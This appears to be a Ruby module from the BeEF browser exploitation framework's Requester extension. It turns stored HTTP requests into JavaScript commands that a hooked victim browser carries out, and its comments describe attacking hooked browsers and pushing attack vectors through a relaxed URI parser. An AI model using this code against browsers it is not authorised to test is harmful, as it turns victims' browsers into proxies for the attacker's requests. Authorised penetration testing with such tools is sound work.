#
#   Copyright 2011 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
module BeEF
  module Extension
    module Requester
      module API
        #
        # Module containing all the functions to run the Requester.
        #
        # That module is dependent on 'Common'. Hence to use it,
        # your code also needs to include that module.
        #
        require 'uri'
        class Hook

          include BeEF::Core::Handlers::Modules::BeEFJS

          #
          # Runs the Requester
          #
          def requester_run(hb, body)
            @body = body
            # we generate all the requests and output them to the hooked browser
            output = []
            BeEF::Core::Models::Http.all(:hooked_browser_id => hb.id, :has_ran => "waiting").each { |h|
              output << self.requester_parse_db_request(h)
            }

            # stop here of our output in empty, that means there aren't any requests to send
            return if output.empty?

            #print_debug("[REQUESTER] Sending request(s): #{output.to_json}")

            # build the beefjs requester component
            build_missing_beefjs_components 'beef.net.requester'

            # we send the command to perform the requests to the hooked browser
            @body << %Q{
              beef.execute(function() {
                beef.net.requester.send(
                  #{output.to_json}
                );
              });
            }
          end

          #
          # Converts a HTTP DB Object into a BeEF JS command that
          # can be executed by the hooked browser.
          #
          def requester_parse_db_request(http_db_object)

            # We're overwriting the URI Parser UNRESERVED regex to prevent BAD URI errors when sending attack vectors (see tolerant_parser)
            tolerant_parser = URI::Parser.new(:UNRESERVED => BeEF::Core::Configuration.instance.get("beef.extension.requester.uri_unreserved_chars"))
            req = WEBrick::HTTPRequest.new(WEBrick::Config::HTTP)
            params = nil

            begin
              s = StringIO.new http_db_object.request
              req.parse(s)
            rescue Exception => e
              # if an exception is caught, we display it in the console but do not
              # stong beef from executing. That is because we do not want to stop
              # attacking the hooked browser because of a malformed request.
              puts e.message
              puts e.backtrace
              return
            end

            http_request_object = nil
            uri = req.unparsed_uri
            if not req['content-length'].nil? and req.content_length > 0
              # POST request
              params = []
              # if the content length is invalid, webrick crashes. Hence we try to catch any exception
              # here and continue execution.
              begin
                req.query.keys.each { |k| params << "#{k}=#{req.query[k]}" }
                params = params.join '&'
              rescue Exception => e
                puts e.message
                puts e.backtrace
                return
              end
              # creating the request object
              http_request_object = {
                  'id' => http_db_object.id,
                  'method' => req.request_method,
                  'host' => req.host,
                  'port' => req.port,
                  'params' => params,
                  'uri' => tolerant_parser.parse(uri).path,
                  'headers' => {}
              }
            else
              #non-POST request (ex. GET): query parameters in URL need to be parsed and added to the URI
              # creating the request object
              query_params = tolerant_parser.split(uri)[7]
              if not query_params.nil?
                req_uri = tolerant_parser.parse(uri).path + "?" + query_params
              else
                req_uri = tolerant_parser.parse(uri).path
              end
              http_request_object = {
                  'id' => http_db_object.id,
                  'method' => req.request_method,
                  'host' => req.host,
                  'port' => req.port,
                  'params' => params,
                  'uri' => req_uri,
                  'headers' => {}
              }
            end
            print_debug("[PROXY] Forwarding request: host[#{req.host}], method[#{req.request_method}], path[#{tolerant_parser.parse(uri).path}], urlparams[#{query_params}], body[#{params}]")
            req.header.keys.each { |key| http_request_object['headers'][key] = req.header[key] }

            http_request_object
          end

        end

      end
    end
  end
end
